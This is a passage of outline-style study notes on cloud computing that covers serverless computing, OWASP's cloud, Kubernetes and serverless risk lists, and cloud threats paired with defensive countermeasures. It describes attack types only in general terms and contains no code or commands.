		- Amazon Elastic Kubernetes Service (EKS) (aws.amazon.com)
		- IBM Cloud Kubernetes Service (www.ibm.com)
		- Docker Kubernetes Service (DKS) (www.docker.com)
		- Kubernetes (kubernetes.io)
- Serverless Computing:
	- Serverless computing is an emerging technology for deploying cloud-based enterprise applications built on containers and microservices. It provides a pay-per-use model, eliminating the burden of manually starting and stopping servers. This allows developers to focus on tasks rather than server management. With serverless computing, developers benefit from scalability and efficiency without requiring deep expertise in cloud infrastructure. This section explores the fundamental concepts of serverless computing.
	- What is Serverless Computing:
		- Serverless computing, also known as serverless architecture or Function as a Service (FaaS), is a cloud-based application model where infrastructure and supporting services are managed by a cloud provider on demand. It simplifies application deployment by removing the need for developers to manage servers and hardware.
		- Although called "serverless," servers are still involved—but they are abstracted away from developers. In a serverless architecture, application code runs on cloud-hosted infrastructure managed by a third-party provider. The cloud provider handles provisioning, scaling, load balancing, and security. Additionally, the provider is responsible for patch management of operating systems and the underlying software and services.
		- Advantages:
			- High scalability and flexibility
			- Faster deployment and updates
			- Reduced infrastructure costs
			- No server management required
			- Pay-per-use pricing model
			- Lower latency and reduced scaling costs
			- Quick provisioning of resources
			- Lower risk of failure
			- No need for system administration
		- Disadvantages:
			- Increased security vulnerabilities
			- Vendor lock-in
			- Challenges in managing statelessness
			- Complex end-to-end application testing
			- Unsuitability for long-running processes
	- Serverless vs. Containers:
		- The table below summarizes the key differences between serverless computing and containers.
		- Containers:
			- The developer is responsible for defining the container configuration files, including the operating system, software, libraries, storage, and networking.
			- The developer creates an image from that file, pushes the image to a registry, and runs a container from the image.
			- Once initiated, the container runs continuously until the developer stops or destroys it.
			- A container requires server support, even when it is not executing any programs.
			- There are no time restrictions for the code running inside a container.
			- Containers can run on a cluster of host nodes.
			- Containers store data in temporary storage or mapped storage volumes.
			- Containers support both complex applications and lightweight microservices.
			- Developers can choose any programming language and runtime for applications running in a container.
		- Serverless Computing:
			- The developer only needs to write and upload the code; the cloud service provider handles the provisioning and management of resources.
			- After execution, the serverless function is automatically terminated by the cloud environment.
			- Serverless computing charges only for the resources consumed during execution.
			- Serverless functions have execution time limits (timeouts).
			- The underlying host infrastructure is abstracted from the developer.
			- Serverless functions do not support temporary storage; instead, data is stored in an object storage medium.
			- Serverless functions are best suited for microservices-based applications.
			- The choice of programming language for serverless functions is restricted by the cloud service provider.
	- Serverless Computing Frameworks:
		- Serverless computing simplifies code execution and application development by eliminating the need for back-end server management. Its adoption is rapidly growing across various industries. Below are some notable serverless cloud computing providers:
			- Microsoft Azure Functions (www.microsoft.com): Microsoft Azure Functions is a serverless computing platform that enables users to run code without provisioning or managing servers. It is fully automated and scales dynamically based on workload volume, allowing users to focus on adding value without worrying about back-end server management.
			- AWS Lambda (aws.amazon.com)
			- Google Cloud Functions (cloud.google.com)
			- Serverless Framework (www.serverless.com)
			- AWS Fargate (aws.amazon.com)
			- Alibaba Cloud Function Compute (www.alibabacloud.com)
- Cloud Computing Threats:
	- Most organizations adopt cloud technology because it reduces costs through optimized and efficient computing. Robust cloud technology offers various services to end users; however, many people are concerned about critical security risks and threats that attackers may exploit to compromise data security, gain unauthorized access to networks, and more. This section discusses the major security threats and vulnerabilities affecting cloud systems.
	- OWASP Top 10 Cloud Security Risks (owasp.org):
		- The table below summarizes the top 10 cloud security risks, according to OWASP.
		- R1 - Accountability and Data Ownership:
			- Organizations increasingly rely on public cloud services instead of traditional data centers.
			- Cloud adoption can lead to a loss of data accountability and control, whereas traditional data centers offer better logical and physical data protection.
			- Public cloud environments may compromise data recoverability, posing critical risks that organizations must address promptly.
		- R2 - User Identity Federation:
			- Enterprises often use services and applications from multiple cloud providers, leading to multiple user identities and complicating credential management.
			- Cloud providers have limited control over user lifecycle management, including offboarding.
		- R3 - Regulatory Compliance:
			- Achieving regulatory compliance in cloud environments can be complex.
			- Data security regulations vary across countries, creating challenges due to differing transparency standards and legal requirements.
		- R4 - Business Continuity and Resiliency:
			- Business continuity planning ensures operations continue despite disasters.
			- Cloud providers' mishandling of business continuity processes can lead to risks and financial losses for organizations.
		- R5 - User Privacy and Secondary Data Usage:
			- Social networking platforms store personal data in the cloud, increasing the risk of data misuse.
			- Default sharing settings on social media can compromise user privacy.
		- R6 - Service and Data Integration:
			- Organizations must ensure secure data transfer between end users and cloud data centers.
			- Unsecured data in transit is vulnerable to eavesdropping and interception attacks.
		- R7 - Multi-Tenancy and Physical Security:
			- Cloud environments use multi-tenancy to share resources and services across multiple clients.
			- Inadequate logical segregation can allow tenants to interfere with each other’s security measures.
		- R8 - Incident Analysis and Forensic Support:
			- Investigating security incidents in cloud environments is challenging due to the distributed nature of event logs across multiple hosts and data centers in different jurisdictions.
			- Law enforcement agencies may face difficulties in forensic recovery due to dispersed log storage.
		- R9 - Infrastructure Security:
			- Infrastructure configurations should align with industry best practices to mitigate risks of malicious actions.
			- Misconfigurations may expose vulnerabilities, allowing attackers to scan networks for unused ports, default passwords, and unsecured applications.
		- R10 - Non-Production Environment Exposure:
			- Non-production environments are used for application development and internal testing.
			- These environments pose security risks, including unauthorized access, data leaks, and information tampering.
	- OWASP Top 10 Kubernetes Risks (owasp.org):
		- The table below summarizes the top 10 Kubernetes risks according to OWASP.
		- K01 - Insecure Workload Configurations:
			- Insecure workload configurations occur when applications are deployed with settings that increase their vulnerability to attacks. Examples include running containers with root privileges, not setting resource limits, or allowing excessive network access.
			- These misconfigurations can be exploited by attackers to escalate privileges, execute arbitrary code, or cause denial-of-service attacks by exhausting system resources.
			- Mitigating these risks involves implementing best practices for workload configuration. This includes setting appropriate security contexts to restrict container privileges, defining resource limits to prevent resource exhaustion, and using network policies to control communication between pods.
		- K02 - Supply Chain Vulnerabilities:
			- Supply chain vulnerabilities arise from integrating third-party software and components, which can introduce security flaws into Kubernetes environments. These vulnerabilities can exist in container images, application dependencies, or CI/CD pipelines, making it critical to secure all elements of the software supply chain.
			- Attackers can exploit these weaknesses to gain unauthorized access, manipulate data, or disrupt services, leading to significant operational and security impacts.
			- Mitigation involves implementing rigorous supply chain security measures, such as regularly scanning container images for vulnerabilities, using signed and verified images, and incorporating security checks into the CI/CD pipeline.
		- K03 - Overly Permissive RBAC Configurations:
			- Overly permissive role-based access control (RBAC) configurations grant excessive permissions to users and services, increasing the attack surface. Attackers or malicious insiders can exploit these broad permissions to gain unauthorized access or escalate privileges within the Kubernetes environment.
			- This can lead to data breaches, system compromises, and operational disruptions, severely affecting the security and integrity of the cluster.
			- To mitigate this risk, organizations should follow the principle of least privilege by carefully defining roles and permissions.
		- K04 - Lack of Centralized Policy Enforcement:
			- The absence of centralized policy enforcement in Kubernetes can lead to inconsistent security policies across clusters. This inconsistency can result in vulnerabilities due to misconfigurations or gaps in security controls, making the environment more susceptible to attacks.
			- This can lead to unauthorized access, data breaches, and compromised workloads, ultimately weakening the overall security posture.
			- To mitigate this risk, organizations should adopt tools such as Open Policy Agent (OPA) to enforce consistent security policies across all clusters.
		- K05 - Inadequate Logging and Monitoring:
			- Inadequate logging and monitoring refer to the lack of comprehensive and detailed logs for activities within the Kubernetes environment. Without proper logging, detecting, investigating, and responding to security incidents becomes challenging.
			- Without adequate visibility, security teams are unaware of potential threats and malicious activities.
			- Mitigation involves implementing comprehensive logging and monitoring practices, including configuring Kubernetes to capture detailed logs of relevant activities, integrating with centralized logging solutions, and setting up real-time alerts for suspicious activities.
		- K06 - Broken Authentication Mechanisms:
			- Broken authentication mechanisms occur when the process of verifying the identity of users and services in a Kubernetes environment is weak. This can result from improper configuration of authentication protocols, weak password policies, or the absence of multi-factor authentication (MFA).
			- These flaws can lead to unauthorized access, allowing attackers to exploit services, steal sensitive information, or disrupt operations.
			- To mitigate these risks, organizations should implement strong authentication practices, including robust authentication protocols, strong password policies, and MFA enforcement.
		- K07 - Missing Network Segmentation Controls:
			- Missing network segmentation controls refer to the lack of proper isolation between different components and workloads within a Kubernetes cluster. Without effective segmentation, attackers can move laterally within the environment once they gain access, increasing the risk of widespread compromise.
			- The absence of network segmentation can lead to significant breaches, unauthorized access to sensitive data, and service disruptions.
			- Mitigation involves implementing network policies to control traffic between pods and services and using third-party solutions to enforce segmentation, limiting lateral movement and containing potential breaches.
		- K08 - Secrets Management Failures:
			- Secrets management failures occur when sensitive information, such as passwords, API keys, or certificates, is improperly stored or handled. Examples include hardcoding secrets in application code or storing them in unsecured locations. Such practices make it easier for attackers to gain access to critical systems and data.
			- If attackers obtain secrets, they can exploit them to compromise applications, escalate privileges, or move laterally within the environment, leading to significant security incidents.
			- To mitigate these risks, organizations should use dedicated secrets management tools, ensure secrets are encrypted, and enforce strict access controls.
		- K09 - Misconfigured Cluster Components:
			- Misconfigured cluster components refer to incorrect settings in core Kubernetes components such as the API server, etcd, or kubelet. These misconfigurations can stem from default settings, lack of security hardening, or manual errors, leaving the cluster vulnerable to attacks.
			- Attackers can exploit these weaknesses to gain control over the cluster, disrupt operations, or steal sensitive data.
			- Mitigation involves regularly auditing cluster configurations, applying security best practices, and keeping components up to date.
		- K10 - Outdated and Vulnerable Kubernetes Components:
			- Using outdated and vulnerable Kubernetes components poses significant security risks. These components may contain known vulnerabilities that attackers can exploit. This includes Kubernetes itself and its dependencies, which must be regularly updated to maintain a secure environment.
			- Attackers can leverage these vulnerabilities to compromise the cluster, leading to severe security incidents.
			- To mitigate these risks, organizations should establish a routine for regularly updating Kubernetes and its associated components.
	- OWASP Top 10 Serverless Security Risks (owasp.org):
		- Serverless computing simplifies application deployment by eliminating the need for developers to manage servers and hardware. However, it also shifts some security responsibilities to cloud service providers. Despite this, serverless applications still execute code, and vulnerabilities within that code can expose them to various application-level attacks, such as cross-site scripting (XSS), SQL injection, denial-of-service (DoS), and broken authentication and authorization. In other words, serverless applications remain susceptible to the same types of attacks as traditional web applications.
		- The table below summarizes the top 10 serverless security risks according to OWASP.
		- 1. Function Event Data Injection:
			- Serverless functions often process input from various event sources (e.g., HTTP requests, message queues). Attackers can inject malicious payloads into these inputs, leading to code execution, data leakage, or denial of service.
			- Mitigation: Validate and sanitize all inputs, enforce strict content security policies, and use security libraries to prevent injection attacks.
		- 2. Broken Authentication:
			- Weak authentication mechanisms can allow unauthorized access to serverless functions, especially when relying on misconfigured identity providers or API keys.
			- Mitigation: Use strong authentication methods such as OAuth, JWTs, and multi-factor authentication (MFA).
		- 3. Insecure Serverless Deployment Configuration:
			- Misconfigurations, such as excessive permissions or publicly exposed endpoints, can increase security risks.
			- Mitigation: Apply the principle of least privilege (PoLP) for function permissions, restrict public access, and regularly audit security settings.
		- 4. Over-Privileged Function Permissions & Roles:
			- Granting excessive permissions to functions can lead to privilege escalation if an attacker compromises the function.
			- Mitigation: Minimize permissions by defining precise IAM policies, using role-based access control (RBAC), and implementing just-in-time access controls.
		- 5. Insecure Application Secrets Storage:
			- Hardcoding credentials or storing secrets in environment variables can lead to data breaches if an attacker gains access.
			- Mitigation: Use dedicated secrets management services like AWS Secrets Manager or Azure Key Vault. Encrypt and rotate secrets regularly.
		- 6. Denial of Service & Financial Resource Exhaustion:
			- Attackers can abuse serverless functions by triggering excessive executions, leading to high costs or degraded performance.
			- Mitigation: Set resource limits, use rate limiting, and implement API gateways with throttling controls.
		- 7. Serverless Business Logic Manipulation:
			- Attackers can manipulate business logic by altering function inputs, leading to fraud, privilege abuse, or data corruption.
			- Mitigation: Define strict access controls, validate all inputs, and implement logging and monitoring for anomalies.
		- 8. Improper Exception Handling & Logging:
			- Poor error handling may expose sensitive data in logs, helping attackers gain insights into system weaknesses.
			- Mitigation: Use structured logging, mask sensitive data in logs, and centralize log monitoring to detect anomalies.
		- 9. Insecure Third-Party Dependencies:
			- Serverless applications often rely on third-party libraries, which may contain vulnerabilities that attackers exploit.
			- Mitigation: Regularly scan dependencies for vulnerabilities, use trusted sources, and apply security patches promptly.
		- 10. Weak Security on Execution Flow Manipulation:
			- Attackers can manipulate function execution flow (e.g., by tampering with state data) to bypass security controls.
			- Mitigation: Use secure state management, apply integrity checks, and validate function execution order.
	- Cloud Computing Threats:
		- Below are some key threats to cloud computing:
		- Data Security:
			- Data Breach / Data Loss:
				- A poorly designed cloud computing environment with multiple clients is at high risk of data breaches. A flaw in one client’s application can allow attackers to access other clients’ data. Data loss or leakage largely depends on the cloud architecture and its operational security.
				- Common data loss issues include:
					- Data being erased, modified, or decoupled (lost).
					- Encryption keys being lost, misplaced, or stolen.
					- Unauthorized access to data due to improper authentication, authorization, or access controls.
					- Cloud service providers (CSPs) misusing client data.
				- Countermeasures:
					- Encrypt both stored data and data in transit to maintain data integrity.
					- Implement strong encryption key generation, storage, and management practices.
					- Ensure data protection measures are incorporated during both design and runtime.
					- Enforce multi-factor authentication (MFA) to enhance access security.
					- Perform regular, secure data backups to mitigate data loss risks.
					- Deploy Data Loss Prevention (DLP) software to detect and prevent potential threats.
					- Establish appropriate security policies by classifying data based on sensitivity levels.
					- Utilize Cloud Access Security Brokers (CASBs) to restrict unauthorized data distribution over the Internet.
					- Employ micro-segmentation to limit data access to specific network nodes.
					- Continuously audit and monitor privileged accounts to detect and mitigate data breaches.
					- Implement perimeter firewalls to filter incoming and outgoing data packets.
			- Loss of Operational and Security Logs:
				- The loss of operational logs makes it difficult to evaluate key operational variables. Without available data for analysis, troubleshooting and issue resolution become significantly limited. Similarly, losing security logs poses a risk to managing and enforcing an effective information security management program. Security log loss may occur due to storage under-provisioning or mismanagement.
				- Countermeasures:
					- Implement effective log management policies and procedures.
					- Regularly monitor and review operational and security logs.
					- Establish and maintain a secure log management system.
					- Restrict access to log files, preventing users from performing file-level operations.
					- Protect archived log files and implement secure protocols for transferring log data to centralized log management servers.
			- Malicious Insiders:
				- Malicious insiders include disgruntled current or former employees, contractors, or business partners who have or had authorized access to cloud resources. They may intentionally misuse or exceed their access privileges to compromise the confidentiality, integrity, or availability of an organization’s information. Such threats can lead to reputational damage, productivity loss, and financial theft.
				- Countermeasures:
					- Enforce strict supply chain management and conduct comprehensive supplier assessments.
					- Define and include human resource security requirements in legal contracts.
					- Require transparency in information security management practices and compliance reporting.
					- Establish clear security breach notification processes.
			- Illegal Access to Cloud Systems:
				- Weak authentication and authorization controls can lead to unauthorized access, compromising confidential and critical data stored in the cloud.
				- Countermeasures:
					- Implement and enforce a robust information security (IS) policy.
					- Allow clients to audit and review the IS policies and procedures of cloud service providers (CSPs).
			- Loss of Business Reputation Due to Co-Tenant Activities:
				- This threat arises due to a lack of resource and reputational isolation, vulnerabilities in hypervisors, and shared infrastructure in cloud environments. Since resources are shared, malicious activity by one co-tenant can negatively impact others, leading to poor service delivery, data loss, and reputational damage to the affected organization.
				- Countermeasures:
					- Choose a reputable and efficient cloud service provider (CSP) to minimize risks and ensure proper resource isolation.
					- Evaluate the virtualization and isolation techniques implemented by the CSP.
					- Assess the risks associated with multi-tenant architectures before deployment.
					- Ensure that CSPs implement proper tenant segregation to prevent cross-tenant interference.
			- Loss of Encryption Keys:
				- Losing encryption keys required for secure communication or system access can allow unauthorized individuals to gain access to sensitive assets. This threat primarily arises from poor key management and weak key generation techniques.
				- Countermeasures:
					- Never store encryption keys alongside encrypted data.
					- Use strong encryption algorithms, such as Advanced Encryption Standard (AES) and Rivest–Shamir–Adleman (RSA), for key generation.
					- Restrict access to key stores and enforce policies such as role separation to control key management.
					- Implement a secure backup and recovery plan for encryption keys.
					- Avoid reusing encryption keys for different purposes.
					- Utilize a hardware security module (HSM) to safeguard encryption keys.
			- Theft of Computer Equipment:
				- The theft of computer equipment may occur due to inadequate physical security controls, such as insufficient access restrictions (e.g., lack of smart card access at entry points). This can lead to the loss of physical equipment and exposure of sensitive data.
				- Countermeasures:
					- Enforce robust physical security measures, including security guards, closed-circuit television (CCTV) surveillance, alarms, identity verification, and secure perimeter fencing.
					- Regularly assess and update security measures to address emerging threats.
					- Implement advanced physical access controls, such as biometric authentication systems.
					- Deploy intrusion alarm systems to detect unauthorized access and alert security personnel promptly.
					- Ensure that server rooms remain locked at all times and restrict access to authorized personnel only.
					- Utilize rack-mounted servers to prevent unauthorized removal or relocation.
					- Secure backup devices and drives in an off-site location to prevent data loss due to theft.
			- Loss or Modification of Backup Data:
				- Attackers may exploit vulnerabilities such as SQL injection and insecure user behavior (e.g., password reuse or improper storage) to gain unauthorized access to cloud backup data. Once access is obtained, they may delete or modify stored data, leading to potential service disruptions. The absence of effective data restoration procedures further increases operational risks.
				- Countermeasures:
					- Implement robust data restoration procedures and tools to enable efficient recovery of lost data.
					- Avoid reliance on a single backup method or storage medium; instead, follow the 3-2-1 backup strategy (three copies of data, stored on two different media, with one copy kept off-site).
			- Improper Data Handling and Disposal:
				- Limited access to cloud infrastructure makes it challenging to verify data handling and disposal procedures followed by cloud service providers (CSPs). When clients request data deletion, the data may not be completely erased due to the following reasons:
					- Multiple copies of data may still exist, even if they are no longer accessible.
					- The storage device scheduled for destruction may also contain data from other clients.
					- Multi-tenancy and hardware resource reuse in cloud environments increase the risk of data persistence.
				- Countermeasures:
					- Use Virtual Private Networks (VPNs) to secure client data and ensure complete removal from primary servers, including all replicas.
					- Encrypt data to make it unreadable, even if residual traces remain after deletion.
					- Establish a data retention policy to securely hold and dispose of data from all backup devices once it becomes obsolete.
					- Implement a data destruction process aligned with the specific storage device and disposal technique used.
					- Enforce a standardized data sanitization strategy to ensure secure deletion.
					- Document all data sanitization steps to create a comprehensive audit trail and validate the destruction process with clients.
		- Cloud Service Misuse:
			- Abuse and Nefarious Use of Cloud Services:
				- Weak registration systems in cloud computing environments may allow attackers to gain anonymous access to cloud services and carry out various attacks, such as password cracking, rainbow table generation, CAPTCHA-solving farms, launching dynamic attack points, hosting exploits and malicious data, botnet command and control, and distributed denial-of-service (DDoS) attacks.
				- Countermeasures:
					- Implement a robust registration and validation process.
					- Monitor client traffic for malicious activities.
					- Identify and block malicious networks using public blacklists.
					- Utilize an advanced credit card fraud monitoring and coordination system for cloud payment services.
					- Choose a high-security cloud service provider (CSP) that actively works to prevent service abuse.
					- Isolate users on the same cloud using per-tenant firewalls.
			- Malicious Probes or Scans:
				- Malicious probing or scanning enables attackers to collect sensitive information, potentially compromising the confidentiality, integrity, and availability of services and data.
				- Countermeasures:
					- Deploy security mechanisms such as firewalls and intrusion detection systems.
					- Avoid placing the hypervisor and virtual machines (VMs) on the same network.
					- Separate hypervisor management and remote access traffic by using a VLAN.
					- Block ping and traceroute responses from the network where the hypervisor is running.
					- Properly configure the management interfaces of the hypervisor.
		- Interface and API Security:
			- Insecure Interfaces and APIs:
				- Interfaces and APIs allow customers to manage and interact with cloud services. Cloud service models must integrate security, and users must be aware of the risks associated with using, implementing, and monitoring these services. Risks of insecure interfaces and APIs include:
					- Circumvention of user-defined policies
					- Exposure of credentials due to inadequate protection
					- Breaches in logging and monitoring mechanisms
					- Unknown API dependencies
					- Reuse of passwords or tokens
					- Insufficient input data validation
				- Countermeasures:
					- Analyze the security model of cloud provider interfaces.
					- Implement strong authentication and access controls.
					- Encrypt data in transit and understand API dependency chains.
					- Use security-focused API frameworks such as the Open Cloud Computing Interface (OCCI) and Cloud Infrastructure Management Interface (CIMI).
					- Employ network monitoring and analysis to gain full visibility and detect API security threats.
					- Never reuse API keys.
				- Ensure that all API traffic is encrypted and that API calls are authenticated at every layer.
		- Operational Security:
			- Insufficient Due Diligence:
				- Lack of awareness regarding a Cloud Service Provider’s (CSP) environment increases operational risks related to security, encryption, incident response, and other issues such as contractual, design, and architectural concerns.
				- Countermeasures:
					- Organizations planning to migrate to the cloud must conduct extensive research on potential risks, perform due diligence on the CSP, and ensure they have skilled resources.
					- Train employees on security standards and resource management.
					- Verify that the CSP maintains a robust Incident Response Plan (IRP) with dedicated teams for implementing security measures during incidents.
					- Establish clear communication with the CSP regarding disaster recovery plans, encryption strategies, and security policies.
					- Enforce stringent security policies aligned with the company's top-level management and governance framework.
			- Shared Technology Issues:
				- Infrastructure-as-a-Service (IaaS) providers share infrastructure components (e.g., GPU, CPU caches) to ensure scalability. However, many of these components lack strong isolation in multi-tenant environments. If attackers exploit vulnerabilities in one client’s applications, they may gain access to other machines. Virtualization hypervisors mediate access between guest operating systems (OSs) and physical resources, but security loopholes can still enable unauthorized access.
				- Countermeasures:
					- Follow security best practices for installation and configuration.
					- Continuously monitor the environment for unauthorized changes or activity.
					- Enforce strong authentication and access controls for administrative operations.
					- Establish service-level agreements (SLAs) for timely patching and vulnerability remediation.
					- Conduct regular vulnerability scanning and configuration audits.
					- Implement strict security controls across all layers of the cloud, including infrastructure, applications, and services.
					- Deploy perimeter, host-based, and per-tenant firewalls to isolate traffic within the cloud environment.
					- Set appropriate file permissions to restrict access to authorized users only.
			- Unknown Risk Profile:
				- An organization's security posture is influenced by factors such as software updates, threat analysis, intrusion detection, and security practices. In cloud environments, clients have limited visibility into the CSP’s internal security procedures, compliance measures, configuration hardening, patching, auditing, and logging. This lack of transparency can hinder risk assessment.
				- Countermeasures:
					- Ensure that CSPs disclose relevant logs and security data to customers.
					- Request partial or full disclosure of infrastructure details (e.g., patch levels, firewall configurations).
					- Implement monitoring and alerting mechanisms for critical security events.
			- Unsynchronized System Clocks:
				- Failure to synchronize system clocks can disrupt automated tasks. For example, if cloud computing devices have mismatched timestamps, network administrators may struggle to accurately analyze log files for malicious activity. Unsynchronized clocks can also cause significant issues in financial transactions, database backups, and other time-sensitive operations.
				- Countermeasures:
					- Use clock synchronization solutions, such as the Network Time Protocol (NTP).
					- Install a time server within the organization’s firewall to enhance security and ensure accurate time synchronization across the network.
					- Deploy a network time system to synchronize clocks with an enterprise network server.
			- Inadequate Infrastructure Design and Planning:
				- Service agreements between Cloud Service Providers (CSPs) and customers define service quality, including downtime, redundancies, data backup processes, and availability. However, CSPs may struggle to meet sudden demand surges due to limited computing resources or poor network design (e.g., traffic flowing through a single point despite available hardware). This can lead to network latency or failure to meet agreed-upon service levels.
				- Countermeasures:
					- Accurately forecast demand and provision sufficient infrastructure accordingly.
					- Plan cloud usage based on workload reliability and uptime requirements.
			- Conflicts Between Client Hardening Procedures and Cloud Environment:
				- Certain client-side security hardening procedures may be incompatible with a CSP’s multi-tenant environment. The shared nature of cloud infrastructure can create conflicts, particularly regarding communication security requirements, which may vary across different customers.
				- Countermeasures:
					- Clearly define the segregation of responsibilities to outline minimum security actions required from customers.
					- Ensure clients have full visibility into their workloads, data, and cloud accounts, especially to mitigate shadow IT risks.
					- Conduct periodic cloud Vulnerability Assessment and Penetration Testing (VAPT) on both the client and CSP sides.
			- Cloud Provider Acquisition:
				- When a Cloud Service Provider (CSP) is acquired, it may lead to strategic shifts that impact existing agreements, particularly non-binding ones. This can create challenges in maintaining security requirements.
				- Countermeasures:
					- Be strategic when selecting a cloud provider—opt for a well-established and reputable CSP to minimize risk.
					- Carefully review the CSP’s data policies to ensure compliance with security and privacy requirements.
					- Assess the security capabilities of the CSP before entering an agreement.
					- Ensure that the Service Level Agreements (SLAs) clearly define mission objectives, success metrics, data collection policies, and security measures.
			- Network Management Failure:
				- Poor network management can result in congestion, misconfigurations, lack of resource isolation, and other issues that negatively impact service performance and security.
				- Countermeasures:
					- Implement a robust security policy to safeguard network integrity.
					- Use proactive network management techniques to detect and resolve issues before they escalate.
					- Stay updated with emerging technologies and assess their suitability for your organization.
					- Ensure that network design and system configurations align with IT governance and meet service and capacity requirements.
					- Implement stringent network monitoring and traffic analysis for both secured and unsecured links.
					- Require all network traffic between Wi-Fi and the enterprise network to pass through a secure VPN.
					- Use cloud network security monitoring tools to gain better visibility into enterprise cloud deployments beyond the network perimeter.
			- Loss of Governance:
				- When using cloud infrastructure, customers relinquish some control to CSPs, which can introduce security risks. SLAs may not always guarantee certain security services, leading to gaps in security defenses. This issue arises due to unclear roles and responsibilities, inadequate vulnerability assessment processes, conflicting SLA commitments, lack of certification and jurisdiction, and the absence of audit mechanisms. Loss of governance can result in noncompliance with security requirements, reduced confidentiality, integrity, and availability of data, as well as poor performance and service quality.
				- Countermeasures:
					- Ensure the thorough and diligent execution of SLAs to avoid governance gaps.
					- Enforce strict governance policies to protect sensitive data and enhance overall system performance.
					- Establish a unified governance framework that covers both on-premises and cloud operations.
					- Leverage automation to verify compliance with governance policies and security standards.
			- Compliance Risks:
				- Organizations striving for compliance with industry standards and legal regulations may face risks if their Cloud Service Provider (CSP):
					- Fails to provide verifiable evidence of compliance.
					- Outsources cloud management to third parties without transparency.
					- Does not allow client audits.
				- These risks stem from inadequate governance over audits and industry-standard assessments, leaving clients unaware of the CSP’s processes, procedures, and practices related to accessibility, identity management, and segregation of duties.
				- Countermeasures:
					- CSPs must ensure that client data remains secure and uncompromised.
					- Organizations should thoroughly review the internal audit processes of their CSP.
			- Economic Denial of Sustainability (EDoS):
				- Cloud services operate on a "pay-as-you-go" model, where customers are charged based on resource consumption, including request duration, data transfer, and CPU cycles. An Economic Denial of Sustainability (EDoS) attack exploits this by overwhelming cloud services with malicious requests, significantly increasing costs and potentially leading to financial strain or even bankruptcy. Attackers may execute malicious code or trigger excessive service usage, leading to inflated billing until the root cause is identified and mitigated.
				- Countermeasure:
					- Deploy an on-demand, in-cloud EDoS mitigation service (scrubber service) to counter application-layer and network-layer Distributed Denial of Service (DDoS) attacks. This can be enhanced by using the client-puzzle approach to deter malicious resource consumption.
			- Limited Cloud Usage Visibility:
				- Insufficient monitoring and lack of insight into cloud resource usage can severely impact an organization’s ability to:
					- Detect unauthorized access and misconfigurations.
					- Identify security incidents before they escalate into data breaches.
					- Maintain compliance with security policies and regulations.
				- Attackers can exploit these blind spots to move laterally within a cloud environment, access sensitive data, and execute malicious activities without leaving detectable traces.
				- Countermeasures:
					- Deploy cloud-native monitoring and logging solutions for real-time visibility into cloud activities.
					- Conduct frequent security audits and generate detailed reports on cloud usage to detect anomalies.
					- Enforce strict access policies and implement multi-factor authentication (MFA) to secure cloud resources.
					- Set up automated alerts to detect and respond to unusual or unauthorized activities promptly.
					- Utilize Cloud Security Posture Management (CSPM) tools to continuously assess and enhance cloud security configurations.
		- Infrastructure and System Configuration:
			- Natural Disasters:
				- Based on geographic location and climate, data centers may be exposed to natural disasters such as floods, lightning, and earthquakes, which can impact cloud services.
				- Countermeasures:
					- Ensure that the organization is located in a low-risk area.
					- Maintain data backups in geographically diverse locations.
					- Implement mitigation measures to reduce or eliminate long-term risks from natural disasters.
					- Develop an effective business continuity and disaster recovery plan.
			- Hardware Failure:
				- Hardware failures—including those affecting switches, servers, routers, access points, hard disks, network cards, and processors—can render cloud data inaccessible. Most hardware failures occur due to hard disk malfunctions, which are complex and time-consuming to diagnose and repair. Hardware failures can degrade service performance and negatively impact business operations.
				- Countermeasures:
					- Implement and maintain robust physical security programs.
					- Keep pre-installed standby hardware devices available.
					- Automate the process of identifying and backing up critical data.
					- Ensure redundancy in workload components to prevent single points of failure.
			- Supply Chain Failure:
				- Supply chain failures can arise due to unclear terms of service, hidden dependencies in cross-cloud applications, poor cloud service provider (CSP) selection, or a lack of supplier redundancy. Cloud providers often rely on third parties, making cloud security dependent on the security of each link in the chain. Any disruption can result in data loss, service unavailability, violation of service-level agreements (SLAs), economic and reputational damage, and cascading failures.
				- Countermeasures:
					- Establish a set of controls to mitigate supply chain risks.
					- Develop a containment plan to minimize damage caused by a compromised counterparty.
					- Implement visibility mechanisms to detect threats within the supply chain.
					- Select third parties that provide insights into the security posture of suppliers.
					- Employ a dedicated team of skilled professionals to safeguard against supply chain failures.
					- Utilize advanced validation technologies such as blockchain and Hyperledger to ensure supply chain reliability.
					- Enforce advanced security policies, including digital signatures, multi-factor authentication (MFA), and secure session management for critical transactions.
					- Adopt a zero-trust architecture to monitor communication links for suspicious activities and maintain security throughout the supply chain.
			- Isolation Failure:
				- Cloud computing relies on multi-tenancy and shared resources. However, weak isolation of storage, memory, routing, and reputation among tenants increases security risks. Attackers may exploit isolation failures to gain unauthorized access to other customers' data.
				- Countermeasure:
					- Ensure strict isolation of memory, storage, and network access between cloud tenants.
			- Cloud Service Termination or Failure:
				- Cloud service termination due to profitability issues, financial instability, or business disputes may lead to data loss if end-users lack legal protection. Factors such as competitive pressure, inadequate business strategies, and lack of financial support can contribute to cloud service failure, resulting in poor service delivery and financial losses. Additionally, failure in outsourced services can impact the CSP’s ability to meet its obligations.
				- Countermeasures:
					- Ensure that cloud providers establish clear and auditable procedures for service termination, including the secure transfer of customer data.
					- Verify that CSPs properly cleanse client data, such as logs and audit files, before service termination.
					- Establish stringent service agreements detailing data retention, exit processes, and deletion policies, backed by applicable legal frameworks.
					- Ensure that CSPs implement secure data deletion protocols to prevent breaches after service termination.
			- Weak Control Plane:
				- Inadequate security and management of the cloud control plane can limit visibility across cloud operations. Attackers may exploit vulnerabilities in the control plane to seize control of cloud resources, access sensitive data, and disrupt services.
				- Countermeasures:
					- Enforce multi-factor authentication (MFA) and stringent access controls.
					- Continuously monitor and audit control plane activities to detect and respond to anomalies.
					- Secure all APIs used for management and ensure they function as expected.
					- Regularly review and apply secure configurations to cloud resources.
					- Implement role-based access control (RBAC) to restrict permissions to only those necessary for specific roles.
		- Network Security:
			- Modifying Network Traffic:
				- In cloud environments, network traffic may be altered due to flaws in provisioning or de-provisioning networks, or vulnerabilities in communication encryption. Such modifications can lead to data loss, alteration, or theft of confidential information and communications.
				- Countermeasure:
					- Perform network traffic analysis using specialized tools to detect any abnormalities.
			- Management Interface Compromise:
				- Customer management interfaces provided by cloud service providers grant access to a vast number of resources over the Internet. This increases security risks, especially when combined with remote access and web browser vulnerabilities. Management interface compromise can result from improper configurations, system and application vulnerabilities, and unauthorized remote access.
				- Countermeasures:
					- Isolate memory, storage, and network access.
					- Use secure protocols to mitigate threats related to remote access.
					- Regularly update patches to prevent web browser vulnerabilities.
					- Deploy a dedicated Virtual Local Area Network (VLAN) for management-level interfaces, ensuring isolation from the enterprise network.
